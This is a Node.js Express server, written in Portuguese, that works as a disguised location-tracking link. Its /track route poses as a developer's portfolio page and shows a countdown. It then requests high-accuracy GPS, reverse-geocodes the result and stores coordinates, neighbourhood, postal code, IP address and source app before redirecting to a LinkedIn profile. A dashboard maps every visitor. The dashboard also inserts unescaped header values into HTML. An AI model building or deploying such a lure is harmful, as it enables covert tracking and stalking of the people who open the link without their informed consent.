const express = require('express');
const https = require('https');
const http = require('http');
const app = express();
const PORT = process.env.PORT || 8080;

app.use(express.json());

const clicks = [];

function fetchJSON(url) {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith('https') ? https : http;
    const options = {
      headers: {
        'User-Agent': 'Mozilla/5.0 (compatible; LocationTracker/1.0)'
      }
    };
    
    lib.get(url, options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    }).on('error', reject);
  });
}

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress;
}

// Dashboard principal
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Dashboard GPS</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          background: white;
          border-radius: 15px;
          padding: 30px;
          margin-bottom: 20px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 { color: #667eea; margin-bottom: 10px; }
        .link-box {
          background: #e3f2fd;
          padding: 15px;
          border-radius: 8px;
          margin-top: 15px;
          border: 2px dashed #667eea;
        }
        .link-box code {
          background: white;
          padding: 10px 15px;
          border-radius: 5px;
          display: block;
          margin: 10px 0;
          color: #667eea;
          font-weight: bold;
          word-break: break-all;
        }
        .btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 10px 25px;
          border-radius: 20px;
          cursor: pointer;
          font-size: 0.95em;
          margin-top: 10px;
        }
        .btn:hover { background: #5568d3; }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-bottom: 20px;
        }
        .stat-card {
          background: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 5px 15px rgba(0,0,0,0.1);
          text-align: center;
        }
        .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
        .stat-label { color: #666; margin-top: 5px; }
        .clicks-container {
          background: white;
          border-radius: 15px;
          padding: 30px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .click-item {
          background: #f8f9fa;
          border-left: 4px solid #28a745;
          padding: 20px;
          margin-bottom: 15px;
          border-radius: 8px;
        }
        .click-item.no-gps {
          border-left-color: #ffc107;
          background: #fff9e6;
        }
        .click-time { 
          font-weight: bold; 
          color: #667eea; 
          font-size: 1.2em; 
          margin-bottom: 15px; 
        }
        .click-info { 
          color: #333; 
          margin: 10px 0; 
          line-height: 1.8; 
          font-size: 1em;
        }
        .badge {
          display: inline-block;
          padding: 6px 14px;
          border-radius: 15px;
          font-size: 0.85em;
          font-weight: bold;
          margin: 10px 0;
        }
        .badge-success { background: #28a745; color: white; }
        .badge-warning { background: #ffc107; color: #333; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📍 Rastreador GPS - Portfólio André</h1>
          <p>Link para o portfólio do André (Desenvolvedor Mobile)</p>
          
          <div class="link-box">
            <strong>🔗 Link de Rastreamento:</strong>
            <code id="trackingLink">Carregando...</code>
            <button class="btn" onclick="copyLink()">📋 Copiar Link</button>
          </div>
        </div>
        
        <div class="stats">
          <div class="stat-card">
            <div class="stat-number" id="totalClicks">0</div>
            <div class="stat-label">Total de Cliques</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="gpsClicks">0</div>
            <div class="stat-label">Com GPS</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="noGpsClicks">0</div>
            <div class="stat-label">Sem GPS</div>
          </div>
        </div>
        
        <div class="clicks-container">
          <button class="btn" onclick="loadData()">🔄 Atualizar</button>
          <h2 style="margin:20px 0;">📋 Últimos Cliques</h2>
          <div id="clicksList">Carregando...</div>
        </div>
      </div>
      
      <script>
        const trackingUrl = window.location.origin + '/track';
        document.getElementById('trackingLink').textContent = trackingUrl;
        
        function copyLink() {
          navigator.clipboard.writeText(trackingUrl);
          alert('✅ Link copiado!');
        }
        
        async function loadData() {
          try {
            const res = await fetch('/api/stats');
            const data = await res.json();
            
            document.getElementById('totalClicks').textContent = data.total;
            
            const gpsClicks = data.clicks.filter(c => c.gpsLocation && c.gpsLocation.city !== 'Desconhecida');
            document.getElementById('gpsClicks').textContent = gpsClicks.length;
            
            const noGpsClicks = data.clicks.filter(c => !c.gpsLocation || c.gpsLocation.city === 'Desconhecida');
            document.getElementById('noGpsClicks').textContent = noGpsClicks.length;
            
            const container = document.getElementById('clicksList');
            
            if (data.clicks.length === 0) {
              container.innerHTML = '<p style="text-align:center; color:#999; padding:40px;">📭 Nenhum clique ainda</p>';
              return;
            }
            
            container.innerHTML = data.clicks.map(c => {
              const date = new Date(c.timestamp).toLocaleString('pt-BR', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
              });
              
              const hasGPS = c.gpsLocation && c.gpsLocation.city !== 'Desconhecida';
              const itemClass = hasGPS ? 'click-item' : 'click-item no-gps';
              
              let origem = '';
              if (c.userAgent.includes('Instagram')) origem = '📸 Instagram';
              else if (c.userAgent.includes('FBAN') || c.userAgent.includes('FBAV')) origem = '📘 Facebook App';
              else if (c.userAgent.includes('WhatsApp')) origem = '💬 WhatsApp';
              else if (c.userAgent.includes('Chrome')) origem = '🌐 Chrome';
              else if (c.userAgent.includes('Safari')) origem = '🧭 Safari';
              else origem = '🌐 Navegador';
              
              let content = '';
              if (hasGPS) {
                const loc = c.gpsLocation;
                content = \`
                  <div class="badge badge-success">✅ GPS ATIVADO</div>
                  <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.city}, \${loc.state}, \${loc.country}</div>
                  \${loc.neighborhood ? \`<div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.neighborhood}</div>\` : ''}
                  \${loc.postalCode ? \`<div class="click-info">📮 <strong>CEP:</strong> \${loc.postalCode}</div>\` : ''}
                  <div class="click-info">🗺️ <strong>Coordenadas:</strong> \${loc.latitude.toFixed(6)}, \${loc.longitude.toFixed(6)}</div>
                  <div class="click-info">📍 <a href="https://www.google.com/maps?q=\${loc.latitude},\${loc.longitude}" target="_blank" style="color:#667eea;">Ver no Google Maps</a></div>
                \`;
              } else {
                content = \`
                  <div class="badge badge-warning">⚠️ GPS NÃO AUTORIZADO</div>
                  <div class="click-info">Usuário negou permissão de localização ou GPS não disponível</div>
                \`;
              }
              
              return \`<div class="\${itemClass}">
                <div class="click-time">⏰ \${date}</div>
                <div class="click-info">🌐 <strong>IP:</strong> \${c.ip}</div>
                \${content}
                <div class="click-info">📱 <strong>Origem:</strong> \${origem}</div>
                <div class="click-info">🔗 <strong>Referer:</strong> \${c.referer || 'Direto'}</div>
              </div>\`;
            }).join('');
          } catch (error) {
            console.error('Erro ao carregar dados:', error);
          }
        }
        
        loadData();
        setInterval(loadData, 10000);
      </script>
    </body>
    </html>
  `);
});

// Rota /track - Página do portfólio do André
app.get('/track', (req, res) => {
  const ip = getIP(req);
  const userAgent = req.headers['user-agent'] || '';
  const referer = req.headers['referer'] || req.headers['referrer'] || 'Direto';
  
  // Registrar o clique inicial (sem GPS ainda)
  const clickData = {
    id: Date.now(),
    ip: ip,
    userAgent: userAgent,
    referer: referer,
    timestamp: new Date().toISOString(),
    gpsLocation: null
  };
  
  clicks.push(clickData);
  
  console.log('');
  console.log('🔔 NOVO CLIQUE');
  console.log('  IP:', ip);
  console.log('  User-Agent:', userAgent.substring(0, 80));
  console.log('  Referer:', referer);
  
  // Servir a página do portfólio do André
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Portfólio - André</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
                background: #0a0a0a;
                color: #fff;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
                position: relative;
                overflow: hidden;
            }
            
            .grid-background {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-image: 
                    linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
                background-size: 50px 50px;
                animation: gridMove 20s linear infinite;
                pointer-events: none;
            }
            
            @keyframes gridMove {
                0% { transform: translate(0, 0); }
                100% { transform: translate(50px, 50px); }
            }
            
            .gradient-orb {
                position: absolute;
                width: 500px;
                height: 500px;
                background: radial-gradient(circle, rgba(99, 102, 241, 0.15), transparent 70%);
                border-radius: 50%;
                filter: blur(60px);
                animation: float 8s ease-in-out infinite;
                pointer-events: none;
            }
            
            .gradient-orb:nth-child(2) {
                top: 20%;
                right: 10%;
                background: radial-gradient(circle, rgba(139, 92, 246, 0.15), transparent 70%);
                animation-delay: -4s;
            }
            
            @keyframes float {
                0%, 100% { transform: translate(0, 0); }
                50% { transform: translate(30px, -30px); }
            }
            
            .container {
                position: relative;
                z-index: 1;
                max-width: 550px;
                width: 100%;
                background: rgba(20, 20, 20, 0.8);
                backdrop-filter: blur(20px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 24px;
                padding: 50px 40px;
                text-align: center;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                animation: slideUp 0.6s ease;
            }
            
            @keyframes slideUp {
                from {
                    opacity: 0;
                    transform: translateY(30px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            
            .avatar {
                width: 100px;
                height: 100px;
                background: linear-gradient(135deg, #6366f1, #8b5cf6);
                border-radius: 50%;
                margin: 0 auto 25px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 48px;
                font-weight: bold;
                border: 3px solid rgba(255, 255, 255, 0.1);
                box-shadow: 0 10px 30px rgba(99, 102, 241, 0.3);
            }
            
            h1 {
                font-size: 36px;
                font-weight: 700;
                margin-bottom: 10px;
                background: linear-gradient(135deg, #fff, #a0a0a0);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }
            
            .subtitle {
                color: #888;
                font-size: 18px;
                margin-bottom: 30px;
                font-weight: 400;
            }
            
            .description {
                color: #b0b0b0;
                font-size: 16px;
                line-height: 1.6;
                margin-bottom: 35px;
            }
            
            .btn {
                background: linear-gradient(135deg, #6366f1, #8b5cf6);
                color: white;
                border: none;
                padding: 16px 50px;
                border-radius: 12px;
                font-size: 17px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                box-shadow: 0 8px 20px rgba(99, 102, 241, 0.4);
                position: relative;
                overflow: hidden;
                width: 100%;
            }
            
            .btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
                transition: left 0.5s;
            }
            
            .btn:hover::before {
                left: 100%;
            }
            
            .btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 12px 30px rgba(99, 102, 241, 0.5);
            }
            
            .btn:active {
                transform: translateY(0);
            }
            
            .timer {
                margin-top: 25px;
                color: #666;
                font-size: 14px;
            }
            
            .timer-number {
                color: #6366f1;
                font-weight: bold;
                font-size: 18px;
            }
            
            .loading {
                display: none;
                margin-top: 20px;
            }
            
            .loading.active {
                display: block;
            }
            
            .spinner {
                border: 3px solid rgba(99, 102, 241, 0.2);
                border-top: 3px solid #6366f1;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
                margin: 0 auto 10px;
            }
            
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="grid-background"></div>
        <div class="gradient-orb"></div>
        <div class="gradient-orb"></div>
        
        <div class="container">
            <div class="avatar">A</div>
            
            <h1>André</h1>
            <div class="subtitle">Desenvolvedor Mobile</div>
            
            <div class="description">
                Desenvolvendo aplicativos mobile inovadores para iOS e Android. Transformando ideias em experiências digitais de alta performance.
            </div>
            
            <button class="btn" id="continueBtn">
                Ver Portfólio Completo
            </button>
            
            <div class="timer">
                Carregando em <span class="timer-number" id="countdown">5</span>s
            </div>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p style="color: #888; font-size: 14px;">Preparando...</p>
            </div>
        </div>

        <script>
            const REDIRECT_URL = 'https://www.linkedin.com/in/andre-oliveira-dos-santos-70067a237';
            const clickId = ${clickData.id};
            
            let seconds = 5;
            let trackingSent = false;
            const countdownElement = document.getElementById('countdown');
            const continueBtn = document.getElementById('continueBtn');
            const loadingElement = document.getElementById('loading');

            async function reverseGeocode(lat, lon) {
                try {
                    const response = await fetch(
                        \`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lon}&accept-language=pt-BR\`
                    );
                    const data = await response.json();
                    
                    return {
                        latitude: lat,
                        longitude: lon,
                        city: data.address?.city || data.address?.town || data.address?.village || 'Desconhecida',
                        state: data.address?.state || 'Desconhecido',
                        country: data.address?.country || 'Desconhecido',
                        neighborhood: data.address?.neighbourhood || data.address?.suburb || '',
                        postalCode: data.address?.postcode || '',
                        fullAddress: data.display_name || ''
                    };
                } catch (error) {
                    return {
                        latitude: lat,
                        longitude: lon,
                        city: 'Erro ao obter',
                        state: '',
                        country: '',
                        error: error.message
                    };
                }
            }

            async function trackAndRedirect() {
                if (trackingSent) return;
                trackingSent = true;

                loadingElement.classList.add('active');
                continueBtn.disabled = true;
                continueBtn.style.opacity = '0.6';

                if ("geolocation" in navigator) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, {
                                enableHighAccuracy: true,
                                timeout: 10000,
                                maximumAge: 0
                            });
                        });

                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const location = await reverseGeocode(lat, lon);

                        await fetch('/save-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                clickId: clickId,
                                gpsLocation: location,
                                locationPermission: 'granted'
                            })
                        });
                    } catch (error) {
                        await fetch('/save-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                clickId: clickId,
                                gpsLocation: null,
                                locationPermission: 'denied',
                                error: error.message
                            })
                        });
                    }
                } else {
                    await fetch('/save-location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            clickId: clickId,
                            gpsLocation: null,
                            locationPermission: 'not_supported'
                        })
                    });
                }

                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 500);
            }

            const interval = setInterval(() => {
                seconds--;
                countdownElement.textContent = seconds;
                
                if (seconds <= 0) {
                    clearInterval(interval);
                    trackAndRedirect();
                }
            }, 1000);

            continueBtn.addEventListener('click', () => {
                clearInterval(interval);
                trackAndRedirect();
            });
        </script>
    </body>
    </html>
  `);
});

// Salvar localização GPS
app.post('/save-location', async (req, res) => {
  try {
    const { clickId, gpsLocation, locationPermission, error } = req.body;
    
    const click = clicks.find(c => c.id === clickId);
    if (!click) {
      return res.json({ success: false, message: 'Click not found' });
    }
    
    click.gpsLocation = gpsLocation;
    click.locationPermission = locationPermission;
    
    if (gpsLocation && gpsLocation.city !== 'Desconhecida') {
      console.log('  ✅ GPS CAPTURADO:', gpsLocation.city, '-', gpsLocation.state);
      console.log('  📍 Coordenadas:', gpsLocation.latitude, gpsLocation.longitude);
    } else {
      console.log('  ⚠️ GPS não autorizado ou erro:', locationPermission);
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Erro ao salvar localização:', error);
    res.json({ success: false, message: error.message });
  }
});

// API de estatísticas
app.get('/api/stats', (req, res) => {
  res.json({
    total: clicks.length,
    clicks: clicks.slice().reverse()
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK',
    uptime: process.uptime(),
    clicks: clicks.length
  });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('========================================');
  console.log('✅ RASTREADOR GPS - PORTFÓLIO ANDRÉ');
  console.log('========================================');
  console.log('🌐 Porta:', PORT);
  console.log('📱 Desenvolvedor Mobile');
  console.log('🔗 Redirect: LinkedIn do André');
  console.log('========================================');
  console.log('');
});
